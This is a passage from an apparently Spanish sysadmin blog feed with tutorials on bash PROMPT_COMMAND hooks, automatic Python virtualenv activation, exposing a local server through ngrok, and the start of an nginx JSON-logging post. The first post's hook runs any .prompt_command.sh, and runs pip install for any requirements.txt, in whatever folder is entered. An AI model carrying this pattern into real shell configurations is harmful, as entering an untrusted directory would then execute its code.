&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ &lt;span class="nb"&gt;source&lt;/span&gt; .bashrc
Current time: &lt;span class="m"&gt;2017&lt;/span&gt;-01-13 &lt;span class="m"&gt;10&lt;/span&gt;:27:11
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Un conjunto de instrucciones por carpeta&lt;/h2&gt;
&lt;p&gt;Supongamos que cada vez que entremos en una carpeta queremos ejecutar un conjunto distinto de comandos. Solo necesitamos que cada carpeta defina su propio &lt;em&gt;script&lt;/em&gt; para ejecutar. Nuestra función va a darse cuenta de que ese &lt;em&gt;script&lt;/em&gt; existe, y lo va a ejecutar automáticamente en caso afirmativo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ cat .bashrc 
...
prompt_command&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;test&lt;/span&gt; -x .prompt_command.sh&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt; ./.prompt_command.sh&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PROMPT_COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;prompt_command
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Des esta forma, cada carpeta que tenga un &lt;em&gt;script&lt;/em&gt; llamado &lt;em&gt;.prompt_command.sh&lt;/em&gt; conseguirá que sea ejecutado cada vez que se dibuje el &lt;em&gt;prompt&lt;/em&gt;. Lo que haga el &lt;em&gt;script&lt;/em&gt; ya es un tema de preferencia personal.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; projects/
gerard@aldebaran:~$ cat sandbox/.prompt_command.sh
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hello world&amp;quot;&lt;/span&gt;
gerard@aldebaran:~/projects$ &lt;span class="nb"&gt;cd&lt;/span&gt; sandbox/
Hello world
gerard@aldebaran:~/projects/sandbox$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es importante ver que solo ha saltado el mensaje informativo en la carpeta &lt;em&gt;sandbox&lt;/em&gt;. De hecho, cada comando que ejecutemos en ella va a disparar el comando. Añadid lógica extra para evitar ejecuciones inútiles.&lt;/p&gt;
&lt;h2&gt;Creación y activado automático de &lt;em&gt;virtualenvs&lt;/em&gt; de python&lt;/h2&gt;
&lt;p&gt;Este es el &lt;em&gt;script&lt;/em&gt; que más trabajo me ahorra. Cuando trabajo con &lt;strong&gt;python&lt;/strong&gt; suelo hacerlo siempre con &lt;em&gt;virtualenv&lt;/em&gt;, y con la variable &lt;strong&gt;PYTHONDONTWRITEBYTECODE&lt;/strong&gt;, para ahorrarme los molestos ficheros &lt;em&gt;.pyc&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La idea es que activar y desactivar el &lt;em&gt;virtualenv&lt;/em&gt; es tedioso, y me gustaría que se activara automáticamente si la carpeta lo tiene, para desactivarlo al salir de la carpeta, aunque sin desactivarlo en las carpetas subordinadas. Como plus, cuando se active el &lt;em&gt;virtualenv&lt;/em&gt;, también puedo hacer que se defina la variable de entorno y que se creen los &lt;em&gt;virtualenvs&lt;/em&gt; de forma automática si no estuvieran creados.&lt;/p&gt;
&lt;p&gt;Para ello, me basta con una convención simple:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Una carpeta con un fichero &lt;em&gt;requirements.txt&lt;/em&gt; debería tener un &lt;em&gt;virtualenv&lt;/em&gt; llamado &lt;em&gt;.venv&lt;/em&gt; en la misma carpeta, con las dependencias instaladas.&lt;/li&gt;
&lt;li&gt;Una carpeta que tenga una carpeta llamada &lt;em&gt;.venv&lt;/em&gt; asume que es un &lt;em&gt;virtualenv&lt;/em&gt; y lo activa, si no estuviera ya activado.&lt;/li&gt;
&lt;li&gt;En caso de no haber una carpeta &lt;em&gt;.venv&lt;/em&gt; pero hubiera un &lt;em&gt;virtualenv&lt;/em&gt; activo, solo se desactivaría si la nueva carpeta no está dentro de la que contenga el &lt;em&gt;virtualenv&lt;/em&gt; activado.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Un &lt;em&gt;virtualenv&lt;/em&gt; define una variable de entorno &lt;strong&gt;VIRTUAL_ENV&lt;/strong&gt; con el &lt;em&gt;path&lt;/em&gt; que lo contiene. El resto es una simple comparación de &lt;em&gt;substrings&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ cat .bashrc 
...
prompt_command&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;test&lt;/span&gt; -e requirements.txt -a ! -e .venv&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
        virtualenv .venv
        ./.venv/bin/pip install -r requirements.txt
    &lt;span class="k"&gt;fi&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;test&lt;/span&gt; -d .venv&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;test&lt;/span&gt; -z &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIRTUAL_ENV&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
            &lt;span class="nb"&gt;source&lt;/span&gt; .venv/bin/activate
            &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PYTHONDONTWRITEBYTECODE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;fi&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;test&lt;/span&gt; -n &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIRTUAL_ENV&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="si"&gt;${#&lt;/span&gt;&lt;span class="nv"&gt;VIRTUAL_ENV&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;-5&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; !&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIRTUAL_ENV&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="si"&gt;${#&lt;/span&gt;&lt;span class="nv"&gt;VIRTUAL_ENV&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;-5&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
                &lt;span class="nb"&gt;unset&lt;/span&gt; PYTHONDONTWRITEBYTECODE
                deactivate
            &lt;span class="k"&gt;fi&lt;/span&gt;
        &lt;span class="k"&gt;fi&lt;/span&gt;
    &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PROMPT_COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;prompt_command
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto ya nos funciona el montaje. Asumamos que tenemos un fichero &lt;em&gt;requirements.txt&lt;/em&gt; en la carpeta &lt;em&gt;sandbox&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; projects/
gerard@aldebaran:~/projects$ cat sandbox/requirements.txt 
&lt;span class="nv"&gt;Django&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.10.5
gerard@aldebaran:~/projects$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo necesitamos entrar en ella para que se ejecute nuestra función; como hay un &lt;em&gt;requirements.txt&lt;/em&gt; y no hay un &lt;em&gt;.venv&lt;/em&gt;, lo crea, instalando en él las dependencias contenidas en el fichero &lt;em&gt;requirements.txt&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/projects$ &lt;span class="nb"&gt;cd&lt;/span&gt; sandbox/
New python executable in /home/gerard/projects/sandbox/.venv/bin/python
Installing setuptools, pip, wheel...done.
Collecting &lt;span class="nv"&gt;Django&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.10.5 &lt;span class="o"&gt;(&lt;/span&gt;from -r requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Using cached Django-1.10.5-py2.py3-none-any.whl
Installing collected packages: Django
Successfully installed Django-1.10.5
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/sandbox$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora ya tenemos en &lt;em&gt;virtualenv&lt;/em&gt; activado, hasta salir de la carpeta. Si volvemos a entrar, solo lo acitva, sin reinstalarlo. Al entrar en una subcarpeta, no lo desactiva.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/sandbox$ &lt;span class="nb"&gt;cd&lt;/span&gt; ..
gerard@aldebaran:~/projects$ &lt;span class="nb"&gt;cd&lt;/span&gt; sandbox/
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/sandbox$ &lt;span class="nb"&gt;cd&lt;/span&gt; folder/
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/sandbox/folder$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto me evito tener que ir preocupándome de los &lt;em&gt;virtualenvs&lt;/em&gt; y de los fichero &lt;em&gt;.pyc&lt;/em&gt;. Muy útil y muy productivo.&lt;/p&gt;</content><category term="bash"></category><category term="variable"></category><category term="PROMPT_COMMAND"></category></entry><entry><title>Exponiendo puertos TCP a través de un firewall con ngrok</title><link href="https://www.linuxsysadmin.ml/2017/06/exponiendo-puertos-tcp-a-traves-de-un-firewall-con-ngrok.html" rel="alternate"></link><published>2017-06-12T10:00:00+02:00</published><updated>2017-06-12T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-06-12:/2017/06/exponiendo-puertos-tcp-a-traves-de-un-firewall-con-ngrok.html</id><summary type="html">&lt;p&gt;A veces tenemos la necesidad de exponer en internet algún puerto TCP de forma temporal, para hacer &lt;em&gt;testing&lt;/em&gt; o alguna &lt;em&gt;demo&lt;/em&gt;. Ya vimos como podemos hacer esto mediante &lt;a href="https://www.linuxsysadmin.ml/2016/10/creando-tuneles-con-ssh.html"&gt;túneles SSH reversos&lt;/a&gt;, aunque no siempre disponemos de un dominio público. En estos casos podemos usar un sistema de túneles llamado &lt;strong&gt;ngrok …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;A veces tenemos la necesidad de exponer en internet algún puerto TCP de forma temporal, para hacer &lt;em&gt;testing&lt;/em&gt; o alguna &lt;em&gt;demo&lt;/em&gt;. Ya vimos como podemos hacer esto mediante &lt;a href="https://www.linuxsysadmin.ml/2016/10/creando-tuneles-con-ssh.html"&gt;túneles SSH reversos&lt;/a&gt;, aunque no siempre disponemos de un dominio público. En estos casos podemos usar un sistema de túneles llamado &lt;strong&gt;ngrok&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;El concepto es muy simple, tal como nos indican en su &lt;a href="https://ngrok.com/"&gt;página web&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Secure tunnels to localhost&lt;/strong&gt;&lt;br&gt;
I want to expose a local server behind a NAT or firewall to the internet.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Se trata de un binario que abre un túnel reverso SSH contra una de sus servidores, exponiendo dicho puerto mediante un dominio de la forma &lt;code&gt;&amp;lt;dominio.ngrok.io&amp;gt;&lt;/code&gt;. Algunas de las funcionalidades requieren una versión de pago, pero la versión gratuita nos puede sacar de algún apuro.&lt;/p&gt;
&lt;h2&gt;El escenario de partida&lt;/h2&gt;
&lt;p&gt;Vamos a suponer que estamos desarrollando una página web y nos interesa que un cliente nos valide que es lo que quiere, o puede ser que pidamos opiniones de terceros.&lt;/p&gt;
&lt;p&gt;Vamos a suponer que es una página HTML simple, aunque podría ser un puerto levantado por nuestro &lt;em&gt;framework&lt;/em&gt; favorito. Para servirlo vamos a utilizar un servidor web simple, por ejemplo, el &lt;em&gt;SimpleHTTPServer&lt;/em&gt; de &lt;strong&gt;python&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;No vamos a desarrollar una página muy completa, solo lo justo para que se vea el ejemplo. Este es nuestro código HTML:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/web$ cat index.html 
&amp;lt;!doctype html&amp;gt;

&amp;lt;html &lt;span class="nv"&gt;lang&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;es&amp;quot;&lt;/span&gt;&amp;gt;

&amp;lt;head&amp;gt;
  &amp;lt;meta &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&amp;gt;
  &amp;lt;title&amp;gt;Lorem ipsum&amp;lt;/title&amp;gt;
  &amp;lt;link &lt;span class="nv"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;style.css&amp;quot;&lt;/span&gt;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
  &amp;lt;h1&amp;gt;Lorem ipsum&amp;lt;/h1&amp;gt;
  &amp;lt;p&amp;gt;Lorem ipsum dolor sit amet&amp;lt;/p&amp;gt;
  &amp;lt;p&amp;gt;Lorem ipsum dolor sit amet&amp;lt;/p&amp;gt;
  &amp;lt;p&amp;gt;Lorem ipsum dolor sit amet&amp;lt;/p&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;
gerard@sodium:~/web$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por poner algo con un poco de color, utilizaremos una hoja de estilo CSS:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/web$ cat style.css 
body &lt;span class="o"&gt;{&lt;/span&gt;
  width: 800px&lt;span class="p"&gt;;&lt;/span&gt;
  margin: auto&lt;span class="p"&gt;;&lt;/span&gt;
  background-color: cyan&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

h1 &lt;span class="o"&gt;{&lt;/span&gt; text-align: center&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
p &lt;span class="o"&gt;{&lt;/span&gt; text-align: justify&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
gerard@sodium:~/web$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y como necesitamos servirla, ponemos un servidor cualquiera para servirlo, por ejemplo, el de &lt;strong&gt;python&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/web$ python -m SimpleHTTPServer
Serving HTTP on &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0 port &lt;span class="m"&gt;8000&lt;/span&gt; ...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este punto podemos ver la página web localmente en &lt;a href="http://localhost:8000/"&gt;http://localhost:8000/&lt;/a&gt;, aunque por estar detrás de un &lt;em&gt;firewall&lt;/em&gt;, nadie más allá del &lt;em&gt;firewall&lt;/em&gt; puede verlo.&lt;/p&gt;
&lt;h2&gt;Instalando ngrok&lt;/h2&gt;
&lt;p&gt;En este caso, el título no es muy acertado, ya que &lt;strong&gt;no se instala&lt;/strong&gt;. Se trata de un solo binario compilado estáticamente, que solo tiene que ser descargado y descomprimido.&lt;/p&gt;
&lt;p&gt;Siguiendo la página de descarga, he elegido el binario que funciona para mi sistema operativo y arquitectura, que para variar es un sistema &lt;em&gt;Linux&lt;/em&gt; de 64 bits. Podemos descargar el enlace directamente en el navegador o con una comando adecuado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~$ wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
converted &lt;span class="s1"&gt;&amp;#39;https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ANSI_X3.4-1968&lt;span class="o"&gt;)&lt;/span&gt; -&amp;gt; &lt;span class="s1"&gt;&amp;#39;https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;UTF-8&lt;span class="o"&gt;)&lt;/span&gt;
--2016-12-27 &lt;span class="m"&gt;17&lt;/span&gt;:18:09--  https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
Resolving bin.equinox.io &lt;span class="o"&gt;(&lt;/span&gt;bin.equinox.io&lt;span class="o"&gt;)&lt;/span&gt;... &lt;span class="m"&gt;107&lt;/span&gt;.20.195.3, &lt;span class="m"&gt;23&lt;/span&gt;.21.165.77, &lt;span class="m"&gt;107&lt;/span&gt;.20.164.208
Connecting to bin.equinox.io &lt;span class="o"&gt;(&lt;/span&gt;bin.equinox.io&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;107&lt;/span&gt;.20.195.3&lt;span class="p"&gt;|&lt;/span&gt;:443... connected.
HTTP request sent, awaiting response... &lt;span class="m"&gt;200&lt;/span&gt; OK
Length: &lt;span class="m"&gt;5142256&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;.9M&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/octet-stream&lt;span class="o"&gt;]&lt;/span&gt;
Saving to: &lt;span class="s1"&gt;&amp;#39;ngrok-stable-linux-amd64.zip&amp;#39;&lt;/span&gt;

ngrok-stable-linux-amd64 &lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="o"&gt;[====================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="m"&gt;4&lt;/span&gt;.90M  &lt;span class="m"&gt;2&lt;/span&gt;.39MB/s   in &lt;span class="m"&gt;2&lt;/span&gt;.0s   

&lt;span class="m"&gt;2016&lt;/span&gt;-12-27 &lt;span class="m"&gt;17&lt;/span&gt;:18:12 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.39 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - &lt;span class="s1"&gt;&amp;#39;ngrok-stable-linux-amd64.zip&amp;#39;&lt;/span&gt; saved &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;5142256&lt;/span&gt;/5142256&lt;span class="o"&gt;]&lt;/span&gt;

gerard@sodium:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se trata de un fichero &lt;em&gt;.zip&lt;/em&gt; que tenemos que descomprimir para obtener el binario.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~$ unzip ngrok-stable-linux-amd64.zip 
Archive:  ngrok-stable-linux-amd64.zip
  inflating: ngrok                   
gerard@sodium:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este punto podemos dejar el nuevo binario en alguna carpeta que esté en el &lt;em&gt;PATH&lt;/em&gt; del sistema, aunque no es necesario. En este caso no voy a hacerlo por brevedad.&lt;/p&gt;
&lt;h2&gt;Levantando el túnel&lt;/h2&gt;
&lt;p&gt;El binario tiene muchas opciones, algunas funcionan en la versión gratuita, pero otras no. Podemos ver lo que tenemos disponible invocando el binario sin más parámetros.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~$ ./ngrok 
NAME:
   ngrok - tunnel &lt;span class="nb"&gt;local&lt;/span&gt; ports to public URLs and inspect traffic

DESCRIPTION:
    ngrok exposes &lt;span class="nb"&gt;local&lt;/span&gt; networked services behinds NATs and firewalls to the
    public internet over a secure tunnel. Share &lt;span class="nb"&gt;local&lt;/span&gt; websites, build/test
    webhook consumers and self-host personal services.
    Detailed &lt;span class="nb"&gt;help&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; each &lt;span class="nb"&gt;command&lt;/span&gt; is available with &lt;span class="s1"&gt;&amp;#39;ngrok help &amp;lt;command&amp;gt;&amp;#39;&lt;/span&gt;.
    Open http://localhost:4040 &lt;span class="k"&gt;for&lt;/span&gt; ngrok&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s web interface to inspect traffic.

EXAMPLES:
    ngrok http &lt;span class="m"&gt;80&lt;/span&gt;                    &lt;span class="c1"&gt;# secure public URL for port 80 web server&lt;/span&gt;
    ngrok http -subdomain&lt;span class="o"&gt;=&lt;/span&gt;baz &lt;span class="m"&gt;8080&lt;/span&gt;   &lt;span class="c1"&gt;# port 8080 available at baz.ngrok.io&lt;/span&gt;
    ngrok http foo.dev:80            &lt;span class="c1"&gt;# tunnel to host:port instead of localhost&lt;/span&gt;
    ngrok tcp &lt;span class="m"&gt;22&lt;/span&gt;                     &lt;span class="c1"&gt;# tunnel arbitrary TCP traffic to port 22&lt;/span&gt;
    ngrok tls -hostname&lt;span class="o"&gt;=&lt;/span&gt;foo.com &lt;span class="m"&gt;443&lt;/span&gt;  &lt;span class="c1"&gt;# TLS traffic for foo.com to port 443&lt;/span&gt;
    ngrok start foo bar baz          &lt;span class="c1"&gt;# start tunnels from the configuration file&lt;/span&gt;

VERSION:
   &lt;span class="m"&gt;2&lt;/span&gt;.1.18

AUTHOR:
  inconshreveable - &amp;lt;alan@ngrok.com&amp;gt;

COMMANDS:
   authtoken    save authtoken to configuration file
   credits  prints author and licensing information
   http     start an HTTP tunnel
   start    start tunnels by name from the configuration file
   tcp      start a TCP tunnel
   tls      start a TLS tunnel
   update   update ngrok to the latest version
   version  print the version string
   &lt;span class="nb"&gt;help&lt;/span&gt;     Shows a list of commands or &lt;span class="nb"&gt;help&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; one &lt;span class="nb"&gt;command&lt;/span&gt;
gerard@sodium:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es muy interesante la opción del puerto TCP, pero esta es de pago. Sin embargo, la opción de un túnel HTTP es gratuita. Es la que vamos a usar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~$ ./ngrok http &lt;span class="m"&gt;8000&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El comando nos va a pintar una página de estado, con alguna información útil para saber a donde tenemos que apuntar el navegador remoto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ngrok by @inconshreveable                                                           &lt;span class="o"&gt;(&lt;/span&gt;Ctrl+C to quit&lt;span class="o"&gt;)&lt;/span&gt;

Session Status                online                                                                
Version                       &lt;span class="m"&gt;2&lt;/span&gt;.1.18                                                                
Region                        United States &lt;span class="o"&gt;(&lt;/span&gt;us&lt;span class="o"&gt;)&lt;/span&gt;                                                    
Web Interface                 http://127.0.0.1:4040                                                 
Forwarding                    http://54b3ca80.ngrok.io -&amp;gt; localhost:8000                            
Forwarding                    https://54b3ca80.ngrok.io -&amp;gt; localhost:8000                           

Connections                   ttl     opn     rt1     rt5     p50     p90                           
                              &lt;span class="m"&gt;0&lt;/span&gt;       &lt;span class="m"&gt;0&lt;/span&gt;       &lt;span class="m"&gt;0&lt;/span&gt;.00    &lt;span class="m"&gt;0&lt;/span&gt;.00    &lt;span class="m"&gt;0&lt;/span&gt;.00    &lt;span class="m"&gt;0&lt;/span&gt;.00                          
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta salida podemos sacar dos datos importantes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;La página pública referente a nuestro túnel, &lt;a href="http://54b3ca80.ngrok.io/"&gt;http://54b3ca80.ngrok.io/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Una página local de estadísticas local en &lt;a href="http://localhost:4040/"&gt;http://localhost:4040/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;La página de estado es una gran utilidad; es en donde podemos ver información de estado y un análisis exhaustivo de las peticiones recibidas. Vale la pena darle un vistazo.&lt;/p&gt;</content><category term="ngrok"></category><category term="túnel"></category><category term="ssh"></category></entry><entry><title>Logs en formato JSON en Nginx</title><link href="https://www.linuxsysadmin.ml/2017/06/logs-en-formato-json-en-nginx.html" rel="alternate"></link><published>2017-06-06T10:00:00+02:00</published><updated>2017-06-06T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-06-06:/2017/06/logs-en-formato-json-en-nginx.html</id><summary type="html">&lt;p&gt;Vimos en un artículo anterior como trabajar con herramientas para agregar los &lt;em&gt;logs&lt;/em&gt; en un mismo servidor, para su consulta. Algunos formatos de &lt;em&gt;logs&lt;/em&gt; necesitan complejas formas de &lt;em&gt;parseado&lt;/em&gt; para que puedan servir de base para nuestra consulta, y en el caso de &lt;strong&gt;logstash&lt;/strong&gt; nos conviene un formato &lt;strong&gt;JSON&lt;/strong&gt; válido …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Vimos en un artículo anterior como trabajar con herramientas para agregar los &lt;em&gt;logs&lt;/em&gt; en un mismo servidor, para su consulta. Algunos formatos de &lt;em&gt;logs&lt;/em&gt; necesitan complejas formas de &lt;em&gt;parseado&lt;/em&gt; para que puedan servir de base para nuestra consulta, y en el caso de &lt;strong&gt;logstash&lt;/strong&gt; nos conviene un formato &lt;strong&gt;JSON&lt;/strong&gt; válido.&lt;/p&gt;
&lt;p&gt;Hay muchos servicios con complejos formatos de &lt;em&gt;log&lt;/em&gt;, pero suelen tener formas para cambiarlos y ahorrarnos así una tediosa expresión regular al configurar &lt;strong&gt;logstash&lt;/strong&gt;. Este es el caso de &lt;strong&gt;nginx&lt;/strong&gt;.&lt;/p&gt;
